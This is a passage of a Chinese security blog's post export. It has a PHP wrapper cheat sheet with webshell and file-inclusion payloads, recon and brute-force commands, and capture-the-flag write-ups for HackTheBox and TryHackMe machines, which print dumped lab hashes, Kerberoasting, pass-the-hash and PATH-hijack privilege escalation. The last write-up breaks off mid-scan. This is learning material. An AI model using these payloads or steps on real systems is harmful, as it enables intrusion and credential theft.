[{"title":"PHP伪协议","url":"/2024/12/17/php/","content":"\nPHP伪协议\n\n<!--more-->\n\n支持的伪协议\n\n```php\nfile:// # 访问本地文件系统\nhttp:// # 访问 HTTP(s) 网址\nftp:// # 访问 FTP(s) URLs\nphp:// # 访问各个输入/输出流（I/O streams）\nzlib:// # 压缩流\ndata:// # 数据（RFC 2397）\nglob:// # 查找匹配的文件路径模式\nphar:// # PHP 归档\n```\n\n## php://\n\n### php://filter\n\nphp://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。一般对其进行编码，让其不执行，从而导致任意文件读取\n\n```php\nphp://filter/read=convert.base64-encode/resource=index.php #base64方式读取\nphp://filter/resource=index.php\n```\n\n#### php://filter协议绕过死亡exit\n\n```php\n# 死亡exit：在写入php代码时执行了以下函数\nfile_put_contents($filename, '<?php exit();?>' . $content);\n\n# 插入一句话木马后\n<?php exit();?>\n<?php @eval($_POST['cmd']);?>\n```\n\n这样插入的一句话木马就不会被执行\n\n当`$content`加上`<?php exit();?>`后，可以使用`php://filter/write=convert.base64-decode`对其绕过\n\n由于base64编码中不包含`,;<>()`等特殊字符，因此`<?php exit();?>`会变为`phpexit`，但是base64编码为4byte一组，因此还需要加上任意一个字符组合，最终payload为\n\n```php\n?filename=php://filter/convert.base64-decode/resource=1.php&content=aPD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==\n# 写入的文件名是1.php，内容为<?php eval($_POST['cmd']);?>[PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg==]\n```\n\n### php://input\n\nphp://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。在enctype=\"multipart/form-data\"的时候，php://input是无效的\n\n```php\nhttp://127.0.0.1/include.php?file=php://input\n\nPOST数据\n<?php phpinfo();?>\n# 写入一句话木马\n<?php fputs(fopen('OneTrojan.php','w'),'<?php @eval($_POST['cmd']); ?>');?>\n```\n\n## data://\n\n数据流封装器，传递相应格式的数据。与文件包含函数（include，require，include_once，require_once）相结合时用来执行php代码\n\n```php\n#include.php\n<?php\nif (isset($_GET[file])){\n\t$filename  = $_GET['file'];\n\tinclude($filename);\n}else{\n    echo \"file\";\n}\n?>\n```\n\n```php\nhttp://127.0.0.1/include.php?file=data://text/plain,<?php phpinfo();?>\nhttp://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\n```\n\n## file://\n\n用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响\n主要用于访问文件（绝对路径、相对路径以及网络路径）\n\n```php\nhttp://127.0.0.1?file=file:///etc/passwd\n```\n\n","tags":["knowledge"]},{"title":"Web界面常见思路","url":"/2024/12/11/Web/","content":"\n# dirsearch\n\n目录扫描工具\n\n```shell\ndirsearch -u http://www.example.com -w /path/to/dic -e* -i 200 -x 400 -r\n```\n\n- `-u` 指定目标URL\n- `-w` 指定字典文件，路径为/db，默认使用dicc\n- `-e` 指定要测试的文件扩展名（php，js等）\n- `-i` 指定保留的响应码\n- `-x` 指定排除的响应码\n- `-r` 递归扫描子目录\n\n# FFUF\n\n全功能扫描工具\n\n## 目录&文件扫描\n\n```bash\nffuf -w directory-list-2.3-medium.txt -u http://example.com/FUZZ -mc 200 -e .php,.txt\n```\n\n- `-w` 指定一个包含潜在目录/文件名的字典文件\n- `-u` 指定目标URL\n- `-mc 200` 指定只显示状态码为200的响应\n- `-e` 指定扩展名\n\n## 子域名爆破\n\n```bash\nffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://example.htb -H \"Host: FUZZ.example.htb\" -mc 200 -c\n```\n\n- `-w` 指定一个包含潜在子域名的字典文件\n- `-u` 指定目标URL\n- `-H` 添加HTTP头信息\n- `-mc 200` 指定只显示状态码为200的响应\n- `-c` 显示颜色\n\n## 暴力破解\n\n```bash\nffuf -u 'http://www.example/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=jose&password=FUZZ' -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -mc all -fs 62 -t 100\n```\n\n- `-w` 指定一个包含潜在密码的字典文件\n- `-X POST` 指定HTTP方法为POST\n- `-d` 指定POST数据\n- `-u` 指定目标URL\n- `-t` 指定并发线程个数\n\n## 匹配器选项\n\n- `-mc` 匹配HTTP状态代码（200,204,301,302,307,403,404,500）\n- `-ml` 匹配响应行数\n- `-mr` 匹配正则表达式\n- `-ms` 匹配HTTP响应大小\n- `-mw` 匹配响应的单词数量\n\n## 过滤器选项\n\n- `-fc` 从响应中筛选HTTP状态代码\n- `-fl` 根据响应的行数进行过滤\n- `-fs` 筛选器HTTP响应大小\n\n# URLFinder\n\n爬取js文件工具\n\n```cmd\nURLFinder.exe -s all -m 2 -u http://www.example.com\n```\n\n# Spring-boot Scan\n\n扫描spring-boot组件泄露漏洞\n\n可以将所有接口统一到dirsearch中进行扫描\n\n```python\npython3 SpringBoot-Scan.py -u example.com\n```\n","tags":["Knowledge"]},{"title":"Administrator","url":"/2024/12/10/Administrator/","content":"\n靶场地址：https://app.hackthebox.com/machines/Administrator\n\n主机：Windows\n\n难度：Medium\n\n# 总体思路：端口扫描->Bloodhound->ForceChangePassword->pwsafe破解->DCSync\n\n## 端口扫描\n\n```bash\nnmap -sSVC 10.10.11.42\n\nStarting Nmap 7.94SVN ( https://nmap.org )\nNmap scan report for administrator.htb (10.10.11.42)\nHost is up (1.8s latency).\nNot shown: 988 closed tcp ports (reset)\nPORT     STATE SERVICE       VERSION\n21/tcp   open  ftp           Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n```\n\n很熟悉的几件套，并且给了用户名和密码：Olivia/ichliebedich\n\n## Bloodhound\n\n上一个bloodhound提取域内信息\n\n```bash\nbloodhound-python -c all -u olivia -p 'ichliebedich' -d administrator.htb -ns 10.10.11.42 --zip\n```\n\n执行完毕后，会生成一个zip文件，将其导入进bloodhound分析\n\n```bash\n# 启动bloodhound\nneo4j start\nbloodhound --no-sandbox\n```\n\n![image-20241210154020686](Administrator/image-20241210154020686.png)\n\n可以看到目前的利用路径为olivia->michael->benjamin，而最终路径为emily->ethan->administrator.htb\n\n一步步来吧那么\n\n### olivia->michael\n\n要实现这一步，需要利用到GenericAll权限\n\n参考链接：https://offensive.run/winecosystem/4acl/README.html#genericall-user\n\n![image-20241210155400943](Administrator/image-20241210155400943.png)\n\n按照他的来，修改michael用户的密码为michael\n\n```bash\nbloodyAD --host 'dc.administrator.htb' -d 'administrator.htb' -u 'olivia' -p 'ichliebedich' set password michael michael\n```\n\n查看是否修改成功，尝试用evil-winrm登录\n\n![image-20241210160226484](Administrator/image-20241210160226484.png)\n\n继续下一步\n\n## ForceChangePassword\n\n### michael->benjamin\n\nmichael对benjamin用户具有ForceChangePassword权限\n\n参考链接：https://book.hacktricks.xyz/cn/windows-hardening/active-directory-methodology/acl-persistence-abuse#forcechangepassword\n\n![image-20241210161108022](Administrator/image-20241210161108022.png)\n\n使用rpcclient强制修改密码\n\n```bash\nrpcclient -U michael 10.10.11.42\nPassword for [WORKGROUP\\michael]:\nrpcclient $> setuserinfo2 benjamin 23 'benjamin'\n```\n\n修改完成后，发现不能使用evil-winrm登录\n\n![image-20241210161619525](Administrator/image-20241210161619525.png)\n\n### benjamin-ftp\n\n经过尝试，发现可以登录上benjamin用户的ftp服务器\n\n![image-20241210161757497](Administrator/image-20241210161757497.png)\n\n有一个备份文件，下载下来\n\n```shell\nftp> binary #切换至二进制传输\n200 Type set to I.\nftp> get Backup.psafe3\n```\n\n让我康康是怎么个事\n\n![image-20241210162234104](Administrator/image-20241210162234104.png)\n\n寄，是一团乱码\n\n## pwsafe破解\n\n查阅后缀可知，psafe3是被加密过后的文件格式，需要用到pwsafe来打开\n\n![image-20241210162507949](Administrator/image-20241210162507949.png)\n\n趁着下载的功夫，先爆破一下文件的密码，在hashcat wiki中能够知道模式为5200\n\n![image-20241210162911722](Administrator/image-20241210162911722.png)\n\n```cmd\nhashcat.exe -m 5200 Backup.psafe3 rockyou.txt\n```\n\n得到凭证**Backup.psafe3:tekieromucho**\n\n把文件和密码丢进pwsafe后，能得到emily用户的密码：**UXLCI5iETUsIBoFVTj8yQFKoHjXmb**（话说这软件竟然不能截屏，复制密码也不会在剪切板中显示）\n\n登录拿到user.txt\n\n### emily->ethan\n\n老样子，emily对ethan有GenericWrite权限\n\n![image-20241212090718858](Administrator/image-20241212090718858.png)\n\n但是这个点貌似不能利用\n\n**Kerberoasting攻击**\n\n在Kerberos验证中，用户使用自己的SPN票据进行验证，这些票据通常使用NTLM哈希加密生成，只要用户注册了SPN，就可以使用GetUserSPNs获得加密的NTLM，解密后就能得到hash值\n\n利用GenericWrite权限给ethan用户添加SPN\n\n工具链接：https://github.com/ShutdownRepo/targetedKerberoast\n\n```python\npython ../../Tools/Windows-AD/targetedKerberoast-main/targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'\n\n[*] Starting kerberoast attacks\n[*] Fetching usernames from Active Directory with LDAP\n[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\n```\n\n显示时钟同步出现问题，查看与服务器时间相差多少\n\n```bash\nntpdig administrator.htb \n\n2024-12-12 17:26:18.180740 (+0800) +25200.186019 +/- 0.141181 administrator.htb 10.10.11.42 s1 no-leap\n```\n\n相差7小时，那就在命令前使用faketime来更改时间\n\n```python\nfaketime -f +7h python ../../Tools/Windows-AD/targetedKerberoast-main/targetedKerberoast.py -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' \n\n[*] Starting kerberoast attacks\n[*] Fetching usernames from Active Directory with LDAP\n[+] Printing hash for (ethan)\n$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$b8636.....16744\n```\n\n使用hashcat解密\n\n![image-20241212103119140](Administrator/image-20241212103119140.png)\n\n```\nhashcat.exe -m 13100 $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$b8636d03af5bd465bf41bdc8fa6709a8$dfd5d0b868efc35b4fbbde75433c0ed7383ee52c97fba5c3f3be482999495a458d6eee0695dd38512f24f1e5c898e8b96d422b0314a6c0344094edf9d1ee1d1a61bfffc1f0a5e215c265e1a7fef0282c98d4dd86106b19b60ce02b67f24115bfad3a092d7a762366eb688c7334171a9d24b5ccd589cf79d497fb1ab6ccf14f5d9bd725147c25b8f7a20c2603754b01d0a1e846a19430616806d179d6ea01ae125e3a2d3d912f7fb766c7c95ceca412ef42a78734107915acc8a2e0503bf993cdd1235a02d8e4d5665fe737ded52f8a4cd8febeb87725061c238c30d83d9eb089137fca2fa823092d458a8b541a92b439258a6c4bdb2aee22da0ef21040ba05ec90b878827b9dd310723f5ca5710b726b77dcca5e2efd9974070c9add53a0eb6d159eab5d4488f732f93c25c61530556a64c78083e6c518949822a13a74fe9c6d54fc58845039399b5e25d5aca8cde12a83482335e37f2cb2516ac6bcb00a0d6b757ef00fc5709d8db79845d379b73f2a4ce9f8ce010274180b3250eb1865f42782b28aed07673f763bad6260645d3fc82eabb6da9a798114255d73cb597f185315c727c5e287b258c1aa904c8b5bd138bab68563410da75a16d9dfd651d95e033488a722942c564b0196cd3a3bd50caf469c4016ef52738dea3ea2053c5c8bc6b0b15ae5933fefaab4c44f689ed89872bb1e56cfc9af4ea0a81e9ce75e98f91aefd90002a5aff649fd9d96c1de99e35d0d8c3af0ce4bcb5e785baae5c1fc8207a840eecd626d21bc7d6e428cbebb74e71d8a841217e0d2823631680f67937d102175555953031b19549302522e6f056c07e71debe4ef89c64aafeb8ddcf10bdacaa3e89b6f8dc54de79978b1fd09bc3741d7207418e21ebab5eb4ed82ece2b0e5843feab41386d4866157e7fc23ea5664e682e0ea0ca50790bf9ecddc49213e5b681ffa7151fa33ef526a895921519702669c3537a6bedfe7eedc5dfb08a34798c55887c6dbe4bb0d820f5b8163e2b632e224a5a074188dfb6b8c2e7ab2e31d6c52adc123fdf9c108394054216be12e2ba59e3ccd9b45bc3c146e812f3070f75d2a4eeea0cd356e2e349ebe05977f6bd1d96df3d1265961e10a582ed10bc04887340b458b8044cc0e58df9a149943f5ade853d62d113a0fd4f466e073f1e7b7201e966dab0e3bb737b725b5abbb7322985accffc1977505c02b1f71bcd712fd27927ae8c04be888d42ecec9f95cf94cf4374423e481414e8757c91cb97ac5e383a20ebccf8334769b6d87781c70364c7ffc5862961ae54e9d2f1e3942f7b3eafcc29f59d554be2e06a59ea6a2439bf6e4a3bcc6c211f71b9abfa6e1726f2253b414a8f1d291fbb02e44410eafc988ebdb9db2ad96f401ca383627d57839dc7347d20fd496fe4b1bcf2b4ed7dbcb7f392f10a2c5e9f546f2352ae1da1dfd20f17fd12a613411ed225a8864da6c080469088e2503798efef0f04b7f2be65536a624f910db581a1c0000e126843dd39140aa4567606c27af05b136f4674216744 rockyou.txt\n```\n\n解得密码为**limpbizkit**\n\n## DCSync\n\n### ethan->administrator\n\nethan用户对administrator具有DCSync权限，这就简单了，直接secretsdump\n\n![image-20241212103553580](Administrator/image-20241212103553580.png)\n\n```bash\nimpacket-secretsdump ethan:limpbizkit@10.10.11.42\n\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied \n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:1181ba47d45fa2c76385a82409cbfaf6:::\nadministrator.htb\\olivia:1108:aad3b435b51404eeaad3b435b51404ee:fbaa3e2294376dc0f5aeb6b41ffa52b7:::\nadministrator.htb\\michael:1109:aad3b435b51404eeaad3b435b51404ee:8864a202387fccd97844b924072e1467:::\nadministrator.htb\\benjamin:1110:aad3b435b51404eeaad3b435b51404ee:95687598bfb05cd32eaa2831e0ae6850:::\nadministrator.htb\\emily:1112:aad3b435b51404eeaad3b435b51404ee:eb200a2583a88ace2983ee5caa520f31:::\nadministrator.htb\\ethan:1113:aad3b435b51404eeaad3b435b51404ee:5c2b9f97e0620c3d307de85a93179884:::\nadministrator.htb\\alexander:3601:aad3b435b51404eeaad3b435b51404ee:cdc9e5f3b0631aa3600e0bfec00a0199:::\nadministrator.htb\\emma:3602:aad3b435b51404eeaad3b435b51404ee:11ecd72c969a57c34c819b41b54455c9:::\nDC$:1000:aad3b435b51404eeaad3b435b51404ee:cf411ddad4807b5b4a275d31caa1d4b3:::\n[*] Kerberos keys grabbed\nAdministrator:aes256-cts-hmac-sha1-96:9d453509ca9b7bec02ea8c2161d2d340fd94bf30cc7e52cb94853a04e9e69664\nAdministrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2\nAdministrator:des-cbc-md5:403286f7cdf18385\nkrbtgt:aes256-cts-hmac-sha1-96:920ce354811a517c703a217ddca0175411d4a3c0880c359b2fdc1a494fb13648\nkrbtgt:aes128-cts-hmac-sha1-96:aadb89e07c87bcaf9c540940fab4af94\nkrbtgt:des-cbc-md5:2c0bc7d0250dbfc7\nadministrator.htb\\olivia:aes256-cts-hmac-sha1-96:713f215fa5cc408ee5ba000e178f9d8ac220d68d294b077cb03aecc5f4c4e4f3\nadministrator.htb\\olivia:aes128-cts-hmac-sha1-96:3d15ec169119d785a0ca2997f5d2aa48\nadministrator.htb\\olivia:des-cbc-md5:bc2a4a7929c198e9\nadministrator.htb\\michael:aes256-cts-hmac-sha1-96:b360c36cb6777b8cc3d88ab1aa60f0064e6ea4fc9b9a4ebacf66345118c0e959\nadministrator.htb\\michael:aes128-cts-hmac-sha1-96:bc3c8269d1a4a82dc55563519f16de8b\nadministrator.htb\\michael:des-cbc-md5:43c2bc231598012a\nadministrator.htb\\benjamin:aes256-cts-hmac-sha1-96:a0bbafbc6a28ed32269e6a2cc2a0ccb35ac3d7314633815768f0518ebae6847f\nadministrator.htb\\benjamin:aes128-cts-hmac-sha1-96:426ca56d39fe628d47066fc3448b645e\nadministrator.htb\\benjamin:des-cbc-md5:b6f84a864376a4ad\nadministrator.htb\\emily:aes256-cts-hmac-sha1-96:53063129cd0e59d79b83025fbb4cf89b975a961f996c26cdedc8c6991e92b7c4\nadministrator.htb\\emily:aes128-cts-hmac-sha1-96:fb2a594e5ff3a289fac7a27bbb328218\nadministrator.htb\\emily:des-cbc-md5:804343fb6e0dbc51\nadministrator.htb\\ethan:aes256-cts-hmac-sha1-96:e8577755add681a799a8f9fbcddecc4c3a3296329512bdae2454b6641bd3270f\nadministrator.htb\\ethan:aes128-cts-hmac-sha1-96:e67d5744a884d8b137040d9ec3c6b49f\nadministrator.htb\\ethan:des-cbc-md5:58387aef9d6754fb\nadministrator.htb\\alexander:aes256-cts-hmac-sha1-96:b78d0aa466f36903311913f9caa7ef9cff55a2d9f450325b2fb390fbebdb50b6\nadministrator.htb\\alexander:aes128-cts-hmac-sha1-96:ac291386e48626f32ecfb87871cdeade\nadministrator.htb\\alexander:des-cbc-md5:49ba9dcb6d07d0bf\nadministrator.htb\\emma:aes256-cts-hmac-sha1-96:951a211a757b8ea8f566e5f3a7b42122727d014cb13777c7784a7d605a89ff82\nadministrator.htb\\emma:aes128-cts-hmac-sha1-96:aa24ed627234fb9c520240ceef84cd5e\nadministrator.htb\\emma:des-cbc-md5:3249fba89813ef5d\nDC$:aes256-cts-hmac-sha1-96:98ef91c128122134296e67e713b233697cd313ae864b1f26ac1b8bc4ec1b4ccb\nDC$:aes128-cts-hmac-sha1-96:7068a4761df2f6c760ad9018c8bd206d\nDC$:des-cbc-md5:f483547c4325492a\n[*] Cleaning up...\n```\n\n得到administrator的hash后直接登录\n\n```bash\nevil-winrm -i 10.10.11.42 -u 'administrator' -H '3dc553ce4b9fd20bd016e098d2d2fd2e'\n```\n\n![image-20241212104002832](Administrator/image-20241212104002832.png)\n\n拿到root.txt\n\n# 相关知识点\n\nWindows域提权命令：https://offensive.run/index.html\n\n渗透测试利用点大全：https://book.hacktricks.xyz/cn\n\npwsafe：https://www.pwsafe.org/\n\n伪造SPN：https://github.com/ShutdownRepo/targetedKerberoast","tags":["HTB"]},{"title":"Lookup","url":"/2024/12/09/Lookup/","content":"\nTHM靶场Lookup\n\n<!--more-->\n\n链接：https://tryhackme.com/r/room/lookup\n\n主机：Linux\n\n难度：easy\n\n# 总体思路：端口&目录扫描->暴力破解->CVE-2019-9194->路径劫持->sudo提权\n\n## 端口&目录扫描\n\n```bash\nnmap -sSVC lookup.thm\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-07 23:35 CST\nNmap scan report for localhost\nHost is up (0.39s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)\n|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)\n|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Did not follow redirect to http://lookup.thm\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\ndirsearch -u lookup.thm\n\n[23:50:13] 403 -  275B  - /.ht_wsr.txt                                      \n[23:50:13] 403 -  275B  - /.htaccess.bak1                                   \n[23:50:14] 403 -  275B  - /.htaccess.orig                                   \n[23:50:14] 403 -  275B  - /.htaccess.save\n[23:50:14] 403 -  275B  - /.htaccess_orig\n[23:50:14] 403 -  275B  - /.htaccess.sample\n[23:50:14] 403 -  275B  - /.htaccess_extra\n[23:50:14] 403 -  275B  - /.htaccessOLD                                     \n[23:50:14] 403 -  275B  - /.htaccess_sc\n[23:50:14] 403 -  275B  - /.html                                            \n[23:50:14] 403 -  275B  - /.htaccessOLD2\n[23:50:14] 403 -  275B  - /.htpasswds                                       \n[23:50:14] 403 -  275B  - /.htm\n[23:50:14] 403 -  275B  - /.htpasswd_test\n[23:50:14] 403 -  275B  - /.htaccessBAK                                     \n[23:50:14] 403 -  275B  - /.httr-oauth                                      \n[23:50:20] 403 -  275B  - /.php                                             \n[23:52:23] 200 -    1B  - /login.php                                        \n[23:53:10] 403 -  275B  - /server-status/                                   \n[23:53:10] 403 -  275B  - /server-status\n```\n\n目前来看就一个登录界面，先进去查看\n\n![image-20241208000753433](Lookup/image-20241208000753433.png)\n\n先随机尝试几个用户名和密码\n\n![image-20241208001624631](Lookup/image-20241208001624631.png)\n\n![image-20241208001705303](Lookup/image-20241208001705303.png)\n\n## 暴力破解\n\n发现他的报错信息不一样，可以利用这一点，先爆破出存在的用户名\n\n```bash\nffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=FUZZ&password=admin' -w /usr/share/seclists/Usernames/Names/names.txt -mc all -ic -fs 74 -t 100\n```\n\n![image-20241208001807501](Lookup/image-20241208001807501.png)\n\n有admin和jose两个用户，再使用ffuf爆破其密码\n\n```\nffuf -u 'http://lookup.thm/login.php' -H 'Content-Type: application/x-www-form-urlencoded' -X POST -d 'username=jose&password=FUZZ' -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -mc all -ic -fs 62 -t 100\n```\n\n![image-20241208001952227](Lookup/image-20241208001952227.png)\n\n获得jose的密码为**password123**\n\n登录后发现其将我们跳转到了files.lookup.thm，这里需要将域名加入hosts后才能访问\n\n![image-20241208002152507](Lookup/image-20241208002152507.png)\n\n进来后界面长这样↓\n\n![image-20241208002316427](Lookup/image-20241208002316427.png)\n\n## CVE-2019-9194\n\n查阅功能点后，发现了elFinder版本为2.1.47，在exploitDB上搜索其漏洞\n\n![image-20241208002644071](Lookup/image-20241208002644071.png)\n\n发现可以直接使用msf进行漏洞利用\n\n![image-20241208003934814](Lookup/image-20241208003934814.png)\n\n选择模块4，设置好参数后exploit\n\n![image-20241208004002396](Lookup/image-20241208004002396.png)\n\n新建一个shell，将其转发到本地，并优化界面\n\n```python\npython3 -c \"import pty;pty.spawn('/bin/bash')\"\n```\n\n![image-20241208004132158](Lookup/image-20241208004132158.png)\n\n查看本机存在的用户\n\n```bash\ncat /etc/passwd\nls /home\n```\n\n发现存在think用户\n\n查看当前用户能够运行的文件\n\n```bash\nfind / -perm -u=s 2>/dev/null\n\n/snap/snapd/19457/usr/lib/snapd/snap-confine\n...\n/usr/sbin/pwm\n/usr/bin/at\n/usr/bin/fusermount\n/usr/bin/gpasswd\n/usr/bin/chfn\n/usr/bin/sudo\n/usr/bin/chsh\n/usr/bin/passwd\n/usr/bin/mount\n/usr/bin/su\n/usr/bin/newgrp\n/usr/bin/pkexec\n/usr/bin/umount\n```\n\n其中/usr/sbin/pwm较为可疑，运行它\n\n![image-20241208004642640](Lookup/image-20241208004642640.png)\n\n提示说/home/www-data/.passwords并不存在，因为我们知道，home目录下只有think用户，且其中有.passwords文件\n\n![image-20241208005019423](Lookup/image-20241208005019423.png)\n\n## 路径劫持\n\n这里尝试使用路径劫持，将id命令的输出修改为think，然后将其路径修改到tmp目录下\n\n```bash\ncd /tmp\necho -e '#!/bin/bash\\necho \"uid=33(think) gid=33(www-data) groups=33(www-data)\"' > /tmp/id\nchmod 777 /tmp/id\nexport PATH=/tmp:$PATH\necho $PATH\n```\n\n![image-20241208005300763](Lookup/image-20241208005300763.png)\n\n可以看到执行完毕后，使用id命令输出的即为think用户\n\n再次运行pwm，输出了许多行密码，保存下来用于爆破think用户密码\n\n```bash\nhydra -l think -P pass.txt lookup.thm ssh\n```\n\n![image-20241208005547902](Lookup/image-20241208005547902.png)\n\n密码为**josemario.AKA(think)**\n\n登录到SSH\n\n查看当前用户可执行权限\n\n![image-20241208005842964](Lookup/image-20241208005842964.png)\n\n## sudo提权\n\n能够以任何用户执行look命令，在[GTFOBins](https://gtfobins.github.io/)上查看提权命令\n\n![image-20241208005942627](Lookup/image-20241208005942627.png)\n\n这里可以选择直接读root.txt，也可以选择读id_rsa\n\n![image-20241208010131169](Lookup/image-20241208010131169.png)\n\n使用id_rsa登录到root用户\n\n![image-20241208010242750](Lookup/image-20241208010242750.png)","tags":["THM"]},{"title":"Linkvortex","url":"/2024/12/09/Linkvortex/","content":"\n靶场地址：https://app.hackthebox.com/machines/LinkVortex\n\n主机：Linux\n\n难度：easy\n\n# 总体思路：端口&目录&子域名扫描->.git文件泄露->CVE-2023-40028->脚本利用\n\n## 端口&目录&子域名扫描\n\n```bash\nnmap -sSVC linkvortex.htb\n\nStarting Nmap 7.94SVN ( https://nmap.org )\nNmap scan report for linkvortex.htb\nHost is up (0.53s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)\n|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)\n80/tcp open  http    Apache httpd\n| http-robots.txt: 4 disallowed entries \n|_/ghost/ /p/ /email/ /r/\n|_http-server-header: Apache\n|_http-title: BitByBit Hardware\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\ndirsearch -u http://linkvortex.htb\n\nTarget: http://linkvortex.htb/\n[11:52:45] Starting: \n[11:52:51] 404 -    7KB - /%3f/                                             \n[11:52:52] 404 -    7KB - /..;/                                             \n[11:52:52] 404 -    7KB - /.admin/                                          \n[11:52:52] 404 -    7KB - /.ansible/                                        \n[11:52:52] 404 -    7KB - /.apt_generated/                                  \n[11:52:52] 404 -    7KB - /.aws/                                            \n[11:52:53] 404 -    7KB - /.build/                                          \n[11:52:53] 404 -    7KB - /.buildpath/\n...\n[11:55:32] 404 -    7KB - /root/                                            \n[11:55:31] 200 -  103B  - /robots.txt                                       \n[11:55:32] 404 -    7KB - /rpc/                                             \n...\nTask Completed\n\nffuf -w /usr/share/wordlists/seclists/Discovery/DNS/shubs-subdomains.txt -H \"Host:FUZZ.linkvortex.htb\" -u \"http://linkvortex.htb\" -c -t 64 -fs 230\n\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://linkvortex.htb\n :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/shubs-subdomains.txt\n :: Header           : Host: FUZZ.linkvortex.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 64\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response size: 230\n________________________________________________\n\ndev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 1423ms]\n```\n\n目标只开放了22和80端口以及存在子域名dev，80端口有一个robots.txt，先去看看\n\n![Linkvortex/image-20241208131227227](Linkvortex/image-20241208131227227.png)\n\n访问一下ghost\n\n![Linkvortex/image-20241208131611772](Linkvortex/image-20241208131611772.png)\n\n~~久违的~~登陆界面\n\n先随意输入一个邮箱\n\n![Linkvortex/image-20241208131903692](Linkvortex/image-20241208131903692.png)\n\n提示email不存在，猜测管理员邮箱\n\n![Linkvortex/image-20241208131941781](Linkvortex/image-20241208131941781.png)\n\n（一猜一个准呐）\n\n这里忘记密码也不管用，查看dev界面\n\n![Linkvortex/image-20241208133811107](Linkvortex/image-20241208133811107.png)\n\n显示正在开发中，对其目录扫描一遍\n\n```bash\nTarget: http://dev.linkvortex.htb/\n[12:05:56] Starting:\n[12:06:09] 301 -  239B  - /.git  ->  http://dev.linkvortex.htb/.git/        \n[12:06:09] 200 -  620B  - /.git/hooks/                                      \n[12:06:09] 200 -   41B  - /.git/HEAD\n[12:06:09] 200 -  201B  - /.git/config\n[12:06:09] 200 -   73B  - /.git/description\n[12:06:09] 200 -  557B  - /.git/                                            \n[12:06:09] 200 -  402B  - /.git/info/                                       \n[12:06:09] 200 -  240B  - /.git/info/exclude\n[12:06:09] 200 -  401B  - 